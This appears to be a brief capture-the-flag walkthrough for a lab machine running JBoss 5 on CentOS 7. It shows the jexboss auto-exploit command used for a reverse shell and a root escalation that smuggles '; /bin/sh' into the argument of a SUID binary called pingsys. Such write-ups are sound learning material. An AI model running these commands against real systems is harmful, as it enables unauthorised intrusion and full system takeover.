Doing subdomain scan on port 80 did not find anything
Seeing that there is jboss running and googling shows a lot of different version vulnerable using the metasploit module to check says its vuln to Jboss unified invoker RCE but cant get call back so I moved to enumerating manually to see what file links we could hit  we were able to hit a couple juicy files that told us version of jboss and OS versions its running  Jboss 5 2008 build and CentOS 7 so I then moved to using a tool called jexboss which automates the exploit to a reverse shell so using this command
`python3 jexboss.py -u http://jacbotheboss.box:8080/ --auto-exploit`
and then it will ask us for RHOST and port if its vulnerable and tells us what its vulnerable to but we all ready know now we got a shell on the host as `jacob` I looked around for a bit in common places for info did not find much so I ran linpeas and found a unknown SUID binary called `pingsys` and we can exploit this for root permissions took me a little bit of googling but found out how to exploit it with this command
`/usr/bin/pingsys '127.0.0.1; /bin/sh'`
And now we are root
